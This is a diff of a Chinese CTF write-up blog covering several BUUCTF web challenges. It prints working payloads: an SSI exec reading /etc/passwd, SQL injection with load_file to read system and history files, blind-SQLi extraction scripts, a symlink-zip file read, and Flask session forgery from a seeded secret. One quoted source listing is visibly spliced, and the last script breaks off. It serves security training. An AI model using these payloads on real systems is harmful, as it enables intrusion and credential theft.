@@ -1,9 +1,9 @@
 ---
-title: 寒假buu30解刷题记录
-date: 2021-02-19 17:57:02
+title: buu30解刷题记录
+date: 2021-02-01 17:57:02
+updated: 2021-03-25 15:27:54
 categories: Write up
 ---
-
 
 
 记录一些在刷题过程中，发现的一些有趣的题目
@@ -194,17 +194,11 @@ oracle 支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 不支持
 但是我们可以通过设置 sql_mode=pipes_as_concat; 来使  ||  用作拼接的作用
 ```
 
-![](https://raw.githubusercontent.com/npfs06/Images/main/img/buu1.png)
+![](https://img.npfs06.top/20210413233059.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
 
 
 
 
-
-![](https://raw.githubusercontent.com/npfs06/Images/main/img/buu2.png)
-
-
-
-![](https://raw.githubusercontent.com/npfs06/Images/main/img/buu3.png)
 
 ```
 在这里我们可以传入  1;set sql_mode=pipes_as_concat;select *,1
@@ -534,6 +528,8 @@ for i in range(1, 10000000):
 
 爆破得到密码为2020666，先测试一下网站基本功能，用户名aaa，密码2020666登录进去，在network处获得文件路径（抓包也可以看到），文件后缀为shtml
 
+![](https://img.npfs06.top/20210326235216.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
 ssi注入
 
 ```
@@ -543,10 +539,11 @@ ssi注入
 
 看到后缀为shtml，可考虑尝试
 
-**直接执行服务器上的各种程序<#exec>**
+**利用SSI注入漏洞，我们可以在username变量中传入ssi语句来远程执行系统命令<#exec>**
 
-> <!--#exec cmd="cat /etc/passwd"-->
-
+```
+<!--#exec cmd="cat /etc/passwd"-->
+```
 
 
 
@@ -817,6 +814,8 @@ http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (向2233端口�
 
 该函数会去掉文件名开头的非ASCII值（%80 --- %ff）
 
+> var_dump(basename("xffconfig.php")); // => config.php var_dump(basename("config.php/xff")); // => config.php
+
 题目的关键代码其实只有上半部分
 
 ```php
@@ -834,9 +833,9 @@ if (isset($_GET['source'])) {
 
 ```
 
-根据题目提示，flag在config.php文件中，通过`?source`读取`$_SERVER['PHP_SELF']`返回的是当前正在执行的脚本的名字`basename("/path/home.php") -> home.php`,如果是`/index.php/config.php/`，则`$_SERVER['PHP_SELF']`返回`/index.php/config.php/`
+根据题目提示，flag在config.php文件中，通过`?source`读取`$_SERVER['PHP_SELF']`返回的是当前正在执行的脚本的名字比如说`basename("/path/home.php") -> home.php`,
 
-即`/index.php/config.php`运行的是`index.php`,但是`basename()`获取到的是`config.php`,然后再通过`?source`读取
+**当我访问index.php时，我可以在后面加上一些东西，比如/index.php/config.php，这样仍然访问的是index.php，但经过basename()后，传进highlight_file()函数的文件名就变成了config.php，如果能绕过那个正则，就可以得到config.php源码了，而$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。**
 
 paylaod:
 
@@ -970,11 +969,9 @@ payload:
 
 **知识点：**
 
-      **1.无数字字母shell**
-    
-      **2.利用.htaccess上传文件**
-    
-      **3.绕过open_basedir**
+**1.无数字字母shell**
+**2.利用.htaccess上传文件**    
+**3.绕过open_basedir**
 
 题目源码
 
@@ -1094,7 +1091,7 @@ ${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0}();&%A0=get_the_flag
 >
 > 最后通过 exif_imagetype() 函数对文件类型进行检查 , 如果文件不是一张图片 , 则不通过检测 .
 
-**PHP版本是 PHP 7.2 , 所以 <script language='php'> ... </script> 这种写法已无法使用 . 要想绕过 " <? " 的检测 , 必须对文件内容进行编码(比如base64)再上传** .
+**PHP版本是 PHP 7.2 , 所以` <script language='php'> ... </script> `这种写法已无法使用 . 要想绕过 " <? " 的检测 , 必须对文件内容进行编码(比如base64)再上传** .
 
 
 
@@ -1415,7 +1412,7 @@ if (isset($_POST['q1']) && isset($_POST['q2']) && isset($_POST['q3']) ) {
 
  **我们只需要将后面接一个不存在的get参数就可以绕过了。例如：`http://127.0.0.1/xxxxxxxx.php?mayi=666y1ng.txt` 他最后显示的页面还是`http://127.0.0.1/xxxxxxxx.php` 这样就可以成功绕过了。**
  **同时还可以利用锚点**
-**`http://127.0.0.1/xxxxxxxx.php#666y1ng.txt**`
+`http://127.0.0.1/xxxxxxxx.php#666y1ng.txt`
 
 
 
@@ -1524,6 +1521,48 @@ echo aesEn('','y1ng');
 
 1. **JSON转义字符绕过**
 2. **php://filter**
+
+```php
+error_reporting(0);
+
+if (isset($_GET['source'])) {
+    show_source(__FILE__);
+    exit();
+}
+
+function is_valid($str) {
+    $banword = [
+      // no path traversal
+      '\.\.',
+      // no stream wrapper
+      '(php|file|glob|data|tp|zip|zlib|phar):',
+      // no data exfiltration
+      'flag'
+    ];
+    $regexp = '/' . implode('|', $banword) . '/i';
+    if (preg_match($regexp, $str)) {
+      return false;
+    }
+    return true;
+}
+
+$body = file_get_contents('php://input');
+$json = json_decode($body, true);
+
+if (is_valid($body) && isset($json) && isset($json['page'])) {
+    $page = $json['page'];
+    $content = file_get_contents($page);
+    if (!$content || !is_valid($content)) {
+      $content = "<p>not found</p>\n";
+    }
+  } else {
+    $content = '<p>invalid request</p>';
+  }
+
+// no data exfiltration!!!
+$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
+echo json_encode(['content' => $content]);
+```
 
 
 
@@ -1848,6 +1887,170 @@ for a in range(1,50):
             break
 print(database)
 ```
+
+
+
+## [网鼎杯 2018]Comment
+
+
+
+花了挺多时间的一题，学到了很多，很有必要详细记录一下
+
+
+
+打开环境，发现是个留言板，想要发贴，需要先登入
+
+> zhangwei
+>
+> zhangwei666
+
+很明显的提示，直接猜中
+
+
+
+看着留言板，第一感觉是sql注入 ~~，一直在找注入点，没找到~~。后知后觉，还没扫源码
+扫下源码 Git泄露，Githacker 恢复下，不过审计后发现代码不完整
+
+>git log  --reflog
+>git reset  --hard  xxx
+
+用以上两个命令，得到完整代码
+
+```php
+<?php
+include "mysql.php";
+session_start();
+if($_SESSION['login'] != 'yes'){
+    header("Location: ./login.php");
+    die();
+}
+if(isset($_GET['do'])){
+switch ($_GET['do'])
+{
+case 'write':
+    $category = addslashes($_POST['category']);
+    $title = addslashes($_POST['title']);
+    $content = addslashes($_POST['content']);
+    $sql = "insert into board
+            set category = '$category',
+                title = '$title',
+                content = '$content'";
+    $result = mysql_query($sql);
+    header("Location: ./index.php");
+    break;
+case 'comment':
+    $bo_id = addslashes($_POST['bo_id']);
+    $sql = "select category from board where id='$bo_id'";
+    $result = mysql_query($sql);
+    $num = mysql_num_rows($result);
+    if($num>0){
+    $category = mysql_fetch_array($result)['category'];
+    $content = addslashes($_POST['content']);
+    $sql = "insert into comment
+            set category = '$category',
+                content = '$content',
+                bo_id = '$bo_id'";
+    $result = mysql_query($sql);
+    }
+    header("Location: ./comment.php?id=$bo_id");
+    break;
+default:
+    header("Location: ./index.php");
+}
+}
+else{
+    header("Location: ./index.php");
+}
+?>
+
+```
+
+代码还是比较容易理解的，~~其实审了好久~~
+
+分为两块内容
+
+1. write
+
+   category 、content  、bo_id 经过 addslashes 转义后写入到数据库的 board 表中
+
+2. comment
+
+   将 category 、content  、bo_id 写入到数据库的 comment 表中，不过在这一模块中只有 content  、bo_id是经过 addslashes 转义 的，而 category 则是从数据库的board表中读取我们在 write 模块中输入的内容，并没有经过 addslashes 转义
+
+
+
+通过审计可以发现存在二次注入
+
+因为comment模块的 category 是我们在write模块写入的内容，而comment 却只显示 content 内容 （要注意虽然category 是经过 addslashes 转义后写入数据库的，但是取出时是没有被转义的，即没有反斜杠的），我们正是利用这一点进行的二次注入，
+
+```
+write模块：title=1&category=',content=(select load_file('/etc/passwd')),/*&content=111
+```
+
+```
+comment模块： $sql = "insert into comment
+                set category = '',content=(select load_file('/etc/passwd')),/*',
+                content = '*/#',
+                bo_id = '$bo_id'";
+```
+
+注入原理如上  /**/是多行注释符   ， # 是单行注释符 
+
+在提交留言的时候，提交`*/#`，这样就成功闭合了，而且将回显的内容放到了content（这里的content是 我们在write模块中写入的category中的content ）里，实现了注入。
+
+~~经过漫长的爆库、报表、爆字段，结果发现flag不在数据库里...~~正确做法如下：
+
+1.读取一下`/etx/passwd`  payload: `',content=(select load_file('/etc/passwd')),/*` 得到了www的用户目录。
+
+![](http://img.npfs06.top/20210413232740.jpeg?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+```
+www:x:500:500:www:/home/www:/bin/bash
+```
+
+
+
+![](http://img.npfs06.top/20210413232830.jpeg?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+我们可以看到 www用户可以登录bash，www为普通用户，家目录为/home/www
+
+
+
+2. .bash_history文件保存了当前用户使用过的历史命令。我们读取下这个文件 payload :`‘,content=(select load_file(‘//home/www/.bash_history’)),/*` 看用户的**命令记录**
+
+```
+cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start
+```
+
+首先是cd到了/tmp/目录，然后unzip了html.zip，然后又把这个.zip文件删除了。然后又把解压得到的html这个文件夹复制到了/var/www/下面，然后又cd到了/var/www/html下，将.DS_Store给删除，然后开启apache2服务。
+
+(这里删除的是/var/www/html下的.DS_Store，而/tmp/html下的.DS_Store没有被删除)
+
+
+
+3.读取 /tmp/html下的.DS_Store 。payload: `', content=(select load_file('/tmp/html/.DS_Store')),/*`
+
+这里的话，又是一个知识点，按照上面这个payload我们发现是没有回显的，这个时候我们需要进行hex编码
+
+
+
+4. payload：`', content=(select hex(load_file('/tmp/html/.DS_Store'))),/*`
+
+![](https://img.npfs06.top/20210413232854.jpeg?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+发现文件 flag_8946e1ff1ee3e40f.php
+
+
+
+5.这里又是一个坑，我们要读取这个文件不能在/tmp目录下，而是要回到/var/www/html
+
+最终payload :`', content=(select (load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*`
+
+最后一个坑，查看源码获得flag
+
+
 
 
 
@@ -8911,3 +9114,2090 @@ public static function activate($pluginName)
 ```
 
 所以来到`/page_admin`，带上 admin 参数来输出 session 即可得到 flag
+
+
+
+## [BSidesCF 2019]Sequel
+
+爆破，账号密码都是guest,登入后，抓包，cookie进行base64解密
+
+![](https://img.npfs06.top/20210313194712.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+然后构造一个新的{“username”:“guest” or “A”=“A”,“password”:“guest”}，将其转化为base64编码并发包，发现成功登陆
+
+paylaod:
+
+```python
+import requests
+import string
+import base64
+
+URL = 'http://cc9386c2-1cc2-41cf-9d8c-c6f7a41a1e4a.node3.buuoj.cn/sequels'
+LETTERS = string.printable
+target = ""
+while True:
+    f = False
+    for e in LETTERS:
+        tmp = target + e
+        # 1.テーブル名を取得
+        #payload = r'{{"username":"\" or CASE WHEN SUBSTR((SELECT name FROM sqlite_master limit 0,1),{},1)=\"{}\" THEN true ELSE false END or \"","password":"guest"}}'.format(len(tmp), e)
+        # 2.usernameを取得
+        # payload = r'{{"username":"\" or CASE WHEN SUBSTR((SELECT username FROM userinfo limit 1,1),{},1)=\"{}\" THEN true ELSE false END or \"","password":"guest"}}'.format(len(tmp),e)
+        # 3.passwordを取得
+        payload = r'{{"username":"\" or CASE WHEN SUBSTR((SELECT password FROM userinfo limit 1,1),{},1)=\"{}\" THEN true ELSE false END or \"","password":"guest"}}'.format(len(tmp),e)
+        payload = base64.b64encode(payload.encode('utf-8')).decode("utf-8")
+        req = requests.Request(
+            'GET',
+            URL,
+            params={
+            },
+            cookies={
+                "1337_AUTH": payload
+            }
+        )
+
+        prepared = req.prepare()
+        s = requests.Session()
+        r = s.send(prepared, allow_redirects=False)
+        if "Movie" in r.text:
+            target = tmp
+            print(target)
+            f = True
+            break
+    if f: continue
+    exit()
+```
+
+username: `sequeladmin`
+
+password`f5ec3af19f0d3679e7d5a148f4ac323d`
+
+登录，即可得到flag
+
+![](https://img.npfs06.top/20210313193843.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+最后再附上一张sqlite_master
+
+```sql
+CREATE TABLE sqlite_master ( 
+	type TEXT, 
+	name TEXT, 
+	tbl_name TEXT, 
+	rootpage INTEGER, 
+	sql TEXT 
+); 
+```
+
+
+
+## [Zer0pts2020]phpNantokaAdmin
+
+
+
+```php
+//utip.php
+<?php
+function redirect($path) {
+  header('Location: ' . $path);
+  exit();
+}
+
+function flash($message, $path = '?page=index') {
+  $_SESSION['flash'] = $message;
+  redirect($path);
+}
+
+function e($string) {
+  return htmlspecialchars($string, ENT_QUOTES);
+}
+
+function is_valid($string) {
+  $banword = [
+    // comment out, calling function...
+    "[\"#'()*,\\/\\\\`-]"
+  ];
+  $regexp = '/' . implode('|', $banword) . '/i';
+  if (preg_match($regexp, $string)) {
+    return false;
+  }
+  return true;
+}
+```
+
+
+
+```php
+//index.php
+<?php
+include 'util.php';
+include 'config.php';
+
+error_reporting(0);
+session_start();
+
+$method = (string) ($_SERVER['REQUEST_METHOD'] ?? 'GET');
+$page = (string) ($_GET['page'] ?? 'index');
+if (!in_array($page, ['index', 'create', 'insert', 'delete'])) {
+  redirect('?page=index');
+}
+
+$message = $_SESSION['flash'] ?? '';
+unset($_SESSION['flash']);
+
+if (in_array($page, ['insert', 'delete']) && !isset($_SESSION['database'])) {
+  flash("Please create database first.");
+}
+
+if (isset($_SESSION['database'])) {
+  $pdo = new PDO('sqlite:db/' . $_SESSION['database']);
+  $stmt = $pdo->query("SELECT name FROM sqlite_master WHERE type='table' AND name <> '" . FLAG_TABLE . "' LIMIT 1;");
+  $table_name = $stmt->fetch(PDO::FETCH_ASSOC)['name'];
+
+  $stmt = $pdo->query("PRAGMA table_info(`{$table_name}`);");
+  $column_names = $stmt->fetchAll(PDO::FETCH_ASSOC);
+}
+
+if ($page === 'insert' && $method === 'POST') {
+  $values = $_POST['values'];
+  $stmt = $pdo->prepare("INSERT INTO `{$table_name}` VALUES (?" . str_repeat(',?', count($column_names) - 1) . ")");
+  $stmt->execute($values);
+  redirect('?page=index');
+}
+
+if ($page === 'create' && $method === 'POST' && !isset($_SESSION['database'])) {
+  if (!isset($_POST['table_name']) || !isset($_POST['columns'])) {
+    flash('Parameters missing.');
+  }
+
+  $table_name = (string) $_POST['table_name'];
+  $columns = $_POST['columns'];
+  $filename = bin2hex(random_bytes(16)) . '.db';
+  $pdo = new PDO('sqlite:db/' . $filename);
+
+  if (!is_valid($table_name)) {
+    flash('Table name contains dangerous characters.');
+  }
+  if (strlen($table_name) < 4 || 32 < strlen($table_name)) {
+    flash('Table name must be 4-32 characters.');
+  }
+  if (count($columns) <= 0 || 10 < count($columns)) {
+    flash('Number of columns is up to 10.');
+  }
+
+  $sql = "CREATE TABLE {$table_name} (";
+  $sql .= "dummy1 TEXT, dummy2 TEXT";
+  for ($i = 0; $i < count($columns); $i++) {
+    $column = (string) ($columns[$i]['name'] ?? '');
+    $type = (string) ($columns[$i]['type'] ?? '');
+
+    if (!is_valid($column) || !is_valid($type)) {
+      flash('Column name or type contains dangerous characters.');
+    }
+    if (strlen($column) < 1 || 32 < strlen($column) || strlen($type) < 1 || 32 < strlen($type)) {
+      flash('Column name and type must be 1-32 characters.');
+    }
+
+    $sql .= ', ';
+    $sql .= "`$column` $type";
+4if ($page === 'delete') {
+  $_SESSION = array();
+  session_destroy();
+  redirect('?page=index');
+}
+
+if ($page === 'index' && isset($_SESSION['database'])) {
+  $stmt = $pdo->query("SELECT * FROM `{$table_name}`;");
+
+  if ($stmt === FALSE) {
+    $_SESSION = array();
+    session_destroy();
+    redirect('?page=index');
+  }
+
+  $result = $stmt->fetchAll(PDO::FETCH_NUM);
+}
+?>
+```
+
+从 index.php 中可以看到，flag作为一个表存储在每个创建的数据库中，这个表具有未知的表名和列名
+
+```
+ $pdo->query('CREATE TABLE `' . FLAG_TABLE . '` (`' . FLAG_COLUMN . '` TEXT);');
+  $pdo->query('INSERT INTO `' . FLAG_TABLE . '` VALUES ("' . FLAG . '");');
+  $pdo->query($sql);
+```
+
+在 index.php 中创建表时，显然存在带有表名、列名和列类型的 SQL 注入。
+
+```
+$stmt = $pdo->prepare("INSERT INTO `{$table_name}` VALUES (?" . str_repeat(',?', count($column_names) - 1) . ")");
+$stmt->execute($values);
+```
+
+不幸的是，这些参数受到长度过滤以及`is _ valid` 函数过滤，这是在 util.php 中定义的。
+
+让我们检查可用字符。
+
+```bash
+$ cat test.php
+<?php
+function is_valid($string) {
+  $banword = [
+    // comment out, calling function...
+    "[\"#'()*,\\/\\\\`-]"
+  ];
+  $regexp = '/' . implode('|', $banword) . '/i';
+  if (preg_match($regexp, $string)) {
+    return false;
+  }
+  return true;
+}
+
+$res = '';
+for ($i = 0x20; $i < 0x7f; $i++) {
+  $c = chr($i);
+  if (is_valid($c)) {
+    $res .= $c;
+  }
+}
+
+echo $res . "\n";
+$ php test.php
+ !$%&+.0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz{|}~
+```
+
+`[`和`]`是可用的,我们在使用sqlite语法的时候列名是可以加方括号的，是为了和mysql语法兼容。例如：
+
+```sql
+select [sql] from sqlite_master;
+```
+
+select的时候，当列名用空白字符隔开时，sqlite只会把空格之前的字符当做列名，并且忽视空格后的字符
+
+![](https://img.npfs06.top/20210314210748.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+而  " ' ` [] 都可以正常包裹列名：
+
+![](https://img.npfs06.top/20210314211650.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+此外，SQLite 还有 CREATE TABLE... AS 语句，可用于从另一个表创建表。创建表时可以不用带括号。例如：
+
+![](https://img.npfs06.top/20210314210648.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+关键代码如下：
+![](https://img.npfs06.top/20210314211541.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+sql语句大致是这样的
+
+```
+CREATE TABLE $table_name (dummy1 TEXT, dummy2 TEXT, `$column` $type);
+```
+
+输入
+`table_name=[aaa] as select [sql][&columns[0][name]=]from sqlite_master;&columns[0][type]=2`
+
+```
+$sql = "CREATE TABLE [aaa] as select [sql][ (dummy1 TEXT, dummy2 TEXT, `]from sqlite_master;` 2);";
+```
+
+等于
+
+```
+create table [aaa] as select sql from sqlite_master
+查找sqlite_master中sql列的值放入aaa表中
+```
+
+得到数据库名和字段名
+
+```
+CREATE TABLE `flag_bf1811da` (`flag_2a2d04c3` TEXT)
+```
+
+继续读取
+
+```
+table_name=[aaa]as select [flag_2a2d04c3][&columns[0][name]=]from flag_bf1811da;&columns[0][type]=2
+$sql = "CREATE TABLE [aaa] as select [flag_2a2d04c3][ (dummy1 TEXT, dummy2 TEXT, `]from flag_bf1811da;` 2);";
+```
+
+等于
+
+```
+create table aaa as select flag_2a2d04c3 from flag_bf1811da
+```
+
+
+
+
+
+## [HCTF 2018]Hideandseek
+
+只有登录功能有用，没有注册功能，简单测试一下登录功能，发现随便输用户名和密码，都能以输入的用户名登录，除了admin之外,猜想是要通过某种方式使用admin登录获取flag。登录之后，来到一个上传页面。
+
+
+
+发现需要上传zip，上传了一个1.txt的文件，页面会返回文件里的内容，这时猜想是否可以进行任意文件读取
+
+这里利用软连接进行文件读取
+
+```
+这里先科普一下Linux的几个命令
+
+1. ln
+功能：
+连接文件或目录。为某一个文件在另外一个位置建立一个同步的链接。当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。
+
+可分为硬连接和符号连接
+[硬链接]
+只能引用同一文件系统中的文件。它引用的是文件在文件系统中的物理索引（也称为 inode）。
+当您移动或删除原始文件时，硬链接不会被破坏，因为它所引用的是文件的物理数据而不是文件在文件结构中的位置。
+硬链接的文件不需要用户有访问原始文件的权限，也不会显示原始文件的位置，这样有助于文件的安全。
+如果您删除的文件有相应的硬链接，那么这个文件依然会保留，直到所有对它的引用都被删除。
+
+[符号链接]
+符号链接 是一个指针，指向文件在文件系统中的位置。
+符号链接可以跨文件系统，甚至可以指向远程文件系统中的文件。
+符号链接只是指明了原始文件的位置，用户需要对原始文件的位置有访问权限才可以使用链接。如果原始文件被删除，所有指向它的符号链接也就都被破坏了。
+它们会指向文件系统中并不存在的一个位置。
+
+[使用方法]
+//硬链接
+ln a.txt b.txt
+//符号链接
+ln -s a.txt b.txt
+
+
+
+2. zip
+功能：用于压缩文件
+
+-y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效
+
+将 /home/html/ 这个目录下所有文件和文件夹打包为当前目录下的 html.zip：
+zip -q -r html.zip /home/html
+```
+
+我们使用如下命令生成软连接
+
+`ln -s /proc/self/environ passwd`，获取系统环境变量,生成一个指向`/etc/passwd`文件的软链接
+
+然后用`zip -y passwd.zip passwd`命令压缩，
+
+然后上传，结果如下图，成功读取。
+
+![](https://img.npfs06.top/20210314215429.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+和前面`admin`不能登录联系起来，猜测这里可能是要用软链接读取相关文件使得可以用admin身份登录。也就是说是要读取跟admin相关的文件，然后以admin身份登录出flag，那么跟admin相关的文件有什么呢，密码文件肯定不是的，因为这个登录就没用到密码，没用到数据库，那既然没用到数据库，程序怎么知道登录用户身份呢，只能是通过session或cookie。于是看一下页面cookie信息，`session=eyJ1c2VybmFtZSI6IjEyMyJ9.Ey-iAg.rmAsie7g8AlN3TSdm9GD9-vTGzI`，很像flask的session信息，解密如下
+
+![](https://img.npfs06.top/20210314222920.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+到这里思路就大致清晰了，我们要用到上传zipfile读取到`SECRET_KEY`，然后伪造admin的session进行登录。
+
+
+
+看了一下之后发现/app/uwsgi.ini这个配置文件，上传zip读取一下
+
+![](https://img.npfs06.top/20210314220050.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+接下去读py文件，这里有个bug
+
+由于是在buu复现，和原题不太一样，原题的main目录并不是这个，而我们去读取原题的main文件才是真正的`main.py`
+原题main.py `/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py`
+
+```python
+ # -*- coding: utf-8 -*-
+from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
+import uuid
+import base64
+import random
+import flag
+from werkzeug.utils import secure_filename
+import os
+random.seed(uuid.getnode())
+app = Flask(__name__)
+app.config['SECRET_KEY'] = str(random.random()*100)
+app.config['UPLOAD_FOLDER'] = './uploads'
+app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
+ALLOWED_EXTENSIONS = set(['zip'])
+
+def allowed_file(filename):
+    return '.' in filename and \
+           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+
+
+@app.route('/', methods=['GET'])
+def index():
+    error = request.args.get('error', '')
+    if(error == '1'):
+        session.pop('username', None)
+        return render_template('index.html', forbidden=1)
+
+    if 'username' in session:
+        return render_template('index.html', user=session['username'], flag=flag.flag)
+    else:
+        return render_template('index.html')
+
+
+@app.route('/login', methods=['POST'])
+def login():
+    username=request.form['username']
+    password=request.form['password']
+    if request.method == 'POST' and username != '' and password != '':
+        if(username == 'admin'):
+            return redirect(url_for('index',error=1))
+        session['username'] = username
+    return redirect(url_for('index'))
+
+
+@app.route('/logout', methods=['GET'])
+def logout():
+    session.pop('username', None)
+    return redirect(url_for('index'))
+
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    if 'the_file' not in request.files:
+        return redirect(url_for('index'))
+    file = request.files['the_file']
+    if file.filename == '':
+        return redirect(url_for('index'))
+    if file and allowed_file(file.filename):
+        filename = secure_filename(file.filename)
+        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        if(os.path.exists(file_save_path)):
+            return 'This file already exists'
+        file.save(file_save_path)
+    else:
+        return 'This file is not a zipfile'
+
+
+    try:
+        extract_path = file_save_path + '_'
+        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
+        read_obj = os.popen('cat ' + extract_path + '/*')
+        file = read_obj.read()
+        read_obj.close()
+        os.system('rm -rf ' + extract_path)
+    except Exception as e:
+        file = None
+
+    os.remove(file_save_path)
+    if(file != None):
+        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
+            return redirect(url_for('index', error=1))
+    return Response(file)
+
+
+if __name__ == '__main__':
+    #app.run(debug=True)
+    app.run(host='0.0.0.0', debug=True, port=10008)
+```
+
+之前复现[CISCN2019 华东南赛区]Web4时做到过，接下去的做法也基本相同
+
+**对全部的源码进行分析了，直接查找所需的SECRET_KEY的值发现：**
+
+```
+app.config['SECRET_KEY'] = str(random.random()*100)
+```
+
+**其对SECRET_KEY做了random随机处理，但random生成的随机数都是伪随机数，有一定的规律。**
+**发现了其中：**
+
+```
+random.seed(uuid.getnode())
+```
+
+**random.seed()方法改变随机数生成器的种子，Python之random.seed()用法**
+**uuid.getnode()方法以48位正整数形式获取硬件地址，也就是服务器的MAC地址**
+
+**若获取了服务器的MAC地址值，那么就可以构造出为伪随机的种子值，想到Linux中一切皆文件，查找到MAC地址存放在/sys/class/net/eth0/address文件中，读取该文件：得到其十六进制所表示的MAC地址**
+
+> 02:42:ac:10:9d:30
+
+然后脚本把它转换为10进制数，然后转换成SECRET_KEY
+
+```
+import random
+mac = "02:42:ac:10:9d:30"
+temp = mac.split(':')
+temp = [int(i,16) for i in temp]
+temp = [bin(i).replace('0b','').zfill(8) for i in temp]
+temp = ''.join(temp)
+mac = int(temp,2)
+random.seed(mac)
+randStr = str(random.random()*100)
+print(randStr)
+```
+
+
+
+然后利用flask-session-cookie-manager进行伪造即可，然后将得到的伪session代替原session，即可得到flag
+
+![](https://img.npfs06.top/20210314223541.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+## [VNCTF 2021]realezjvav
+
+查看源码
+
+![](https://img.npfs06.top/20210317191712.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+再结合hint，很明显要sql注入
+
+fuzz一下 发现过滤的并不多 但是延时函数sleep()等过滤了 并且貌似不能布尔盲注 搜了下 可以笛卡尔积盲注
+
+```python
+import requests
+url="http://d1dce35d-de55-4046-a7a0-ca8e319394d7.node3.buuoj.cn//user/login"
+flag=''
+for i in range(1,50):
+    f1=flag
+    top=127
+    low=33
+    while low<=top:
+        mid=(top+low)//2
+        # p1="admin'/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='user'),{},1))={},1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#".format(i,mid)
+        # p2="admin'/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='user'),{},1))>{},1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#".format(i,mid)
